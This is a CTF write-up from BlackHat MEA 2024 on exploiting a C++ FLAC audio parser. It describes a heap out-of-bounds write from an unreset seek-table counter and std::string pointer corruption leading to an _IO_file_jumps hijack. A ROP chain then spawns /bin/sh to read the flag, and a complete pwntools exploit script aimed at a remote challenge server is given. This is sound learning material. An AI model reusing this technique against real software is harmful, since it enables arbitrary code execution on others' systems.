+++ 
draft = false
date = 2024-09-02T20:24:09+02:00
title = "the ring - BlackHat MEA CTF 2024"
description = "Exploiting a C++ FLAC parser to get the flag"
slug = ""
authors = ["bitfriends"]
tags = ["linux","c++","parser"]
categories = ["ctf"]
externalLink = ""
series = []
+++

I had a fun time playing BlackHat MEA CTF. This pwn challenge was particulary nice.

In "the ring" you were given a `FLAC` audio file parser, written in C++.
You can provide such a custom audio file and get presented the output of the program.
Notice that there is a Python wrapper handling the file and outputs readable text only.

Now the general functionality of the program:
The program checks the magic bytes first (`#define FLAC_MAGIC 0x664c6143U`) and then immedeately
starts looking for the initial `TYPE_STREAMINFO` block, which may be followed by more blocks.

Blocks in this case are chunks of data, that have a specific type and data associated to them.
In the header file we can find the following block types:
```c
enum FlacType {
  TYPE_STREAMINFO = 0,
  TYPE_PADDING,
  TYPE_APPLICATION,
  TYPE_SEEKTABLE,
  TYPE_VORBIS_COMMENT,
  TYPE_CUESHEET,
  TYPE_PICTURE,
};
```
Each block is handeled differently and the same type can be present mulitple times.
After looking for some bugs in the individual block functions, I found this:
```c
void FlacFile::parseBlockSeekTable(uint32_t size) {
  if (size % 18) {
    _lastError = FLAC_INVALID_SEEKTABLE;
    return;
  }

  uint32_t tableCount = size / 18;
  _seekPoints.resize(tableCount);
  for (size_t i = 0; i < tableCount; i++) {
    _seekPoints[_seekPointsCount].number = getBig64();
    _seekPoints[_seekPointsCount].offset = getBig64();
    _seekPoints[_seekPointsCount].sampleCount = getBig16();
    _seekPointsCount++;
  }
}
```
The problem is the index variable `_seekPointsCount` due to it not being reset after the loop.
We can put multiple blocks of type `TYPE_SEEKTABLE` with the same and constant `size`.
Now `_seekPointsCount` acts like a global counter will eventually become greater than `size`.
This allows an out-of-bounds write on the heap.

As a target I chose a block of type `TYPE_VORBIS_COMMENT`, because it internal structure has `std::string`s as members,
lying on the heap and getting reused too. Now you could corrupt the `pointer` of
a `std::string` object, that specifies where the data is stored.
```
0xf2e7630:      0x000000000f2e7640      0x0000000000000078      // [pointer]    [size_type]
0xf2e7640:      0x4141414141414141      0x4141414141414141
```

If you read data in that string again, you can write to your custom address.
I used `vendor` and one string if `commentList` as targets.
The binary was statically linked and there was no PIE, so we had all the freedom we needed.

To get RIP control, I chose `_IO_file_jumps` to overwrite, which was `rw` in the binary.
Overwriting the entry of `fflush` was quite useful, since the registers contained good values.
Many of them pointed to `stderr`, so that's where I wrote to with the second `std::string`.
After some fiddling around and using the gadget `mov rsp, rcx ; pop rcx ; jmp rcx`, I was able
to pivot the stack to `stderr`, where my ropchain was lying.

So all that was left to do now is to rop. Be careful that you don't have stdin and that you
can only print human readable characters. The easiest way to do this was to create an `execve` call:
```
execve("/bin/sh", ["/bin/sh", "-c", "cat", "/flag*"], NULL)
```
This was rather simple to do and sucessfully outputs the flag file:
```
[+] Starting local process '/usr/bin/python3': pid 252854
[*] Switching to interactive mode
: === FLAC Info ===
FLAG{*** REDACTED ***}

[*] Got EOF while reading in interactive
$
```
Exploit code:
```py
from pwn import *
import subprocess

TYPE_STREAMINFO = 0
TYPE_PADDING = 1
TYPE_APPLICATION = 2
TYPE_SEEKTABLE = 3
TYPE_VORBIS_COMMENT = 4
TYPE_CUESHEET = 5
TYPE_PICTURE = 6

def p24(x, endian='little'):
    return p32(x, endian=endian)[1:]

file_jumps = 0x5de100
stderr_ptr = 0x5deca0
stderr_stuff = 0x5e2560
gadget = 0x4a8c39 # mov rsp, rcx ; pop rcx ; jmp rcx

pop_rax = 0x42111a
pop_rdi = 0x40591d
pop_rsi = 0x4073a3
pop_rdx_rbx = 0x533dab
binsh = file_jumps
binsh_args = binsh + 0x18
syscall = 0x4db386
ret = 0x40101a

f = open("./payload", "wb+")

overflow = b""
overflow += p8(TYPE_SEEKTABLE, endian='big')
overflow += p24(0x12, endian='big') # len
overflow += p64(0x4242424242424242, endian='big')
overflow += p64(file_jumps, endian='big')
overflow += p16(0x4242, endian='big')

overflow1 = b""
overflow1 += p8(TYPE_SEEKTABLE, endian='big')
overflow1 += p24(0x12, endian='big') # len
overflow1 += p64(stderr_ptr, endian='big')
overflow1 += p64(0x100, endian='big')
overflow1 += p16(0x4343, endian='big')

payload = b"/bin/sh\x00-c\x00cat /flag*\x00AA" + p64(binsh) + p64(binsh+8) + p64(binsh+11) + p64(0x0) + b"A"*0x20 + p64(gadget)
payload = payload.ljust(0x78, b"\x41")

rop = b""
rop += p64(ret)
rop += p64(pop_rax)
rop += p64(0x3b)
rop += p64(pop_rdi)
rop += p64(binsh)
rop += p64(pop_rsi)
rop += p64(binsh_args)
rop += p64(pop_rdx_rbx)
rop += p64(0x0)
rop += p64(0x0)
rop += p64(syscall)
rop += p64(pop_rax)
rop += p64(0x3c)
rop += p64(pop_rdi)
rop += p64(0x0)
rop += p64(syscall)

comment = b""
comment += p8(TYPE_VORBIS_COMMENT, endian='big')
comment += p24(0x1c+0x70+0xd8, endian='big') # len
comment += p32(0x78) # len
comment += payload # vendor
comment += p32(0x1) # count
comment += p32(0xe0) # len
comment += p64(ret) + rop + p64(stderr_stuff) + b"A"*0x48 + p64(file_jumps+0x58-0x60)

end = b""
end += p8(TYPE_CUESHEET | 128, endian='big')
end += p24(0, endian='big')

filedata = b""
filedata += p32(0x664c6143, endian='big')
filedata += p8(TYPE_STREAMINFO, endian='big')
filedata += p24(34, endian='big') # len
filedata += p16(0x1337, endian='big')
filedata += p16(0x1338, endian='big')
filedata += p24(3, endian='big')
filedata += p24(4, endian='big')
filedata += p32(5, endian='big')
filedata += p32(6, endian='big')
filedata += b"Z"*0x10

filedata += overflow

filedata += comment

filedata += overflow
filedata += overflow1*9

filedata += comment

filedata += end

f.write(filedata)
f.close()

context.terminal = ["tmux", "splitw", "-h"]

p = remote("18.203.110.195", 30624)
#p = process(["python3", "./run.py"])
#p = gdb.debug(["./parser", "./payload"])

p.recvuntil("proof of work:\n")
cmd = p.recvline().strip(b"\n").decode("ascii")
print(cmd)
sol = input("solution: ")
p.sendline(sol)

p.sendlineafter(b"Size", str(len(filedata)).encode("ascii"))
p.sendlineafter(b"File", filedata)
p.interactive()
```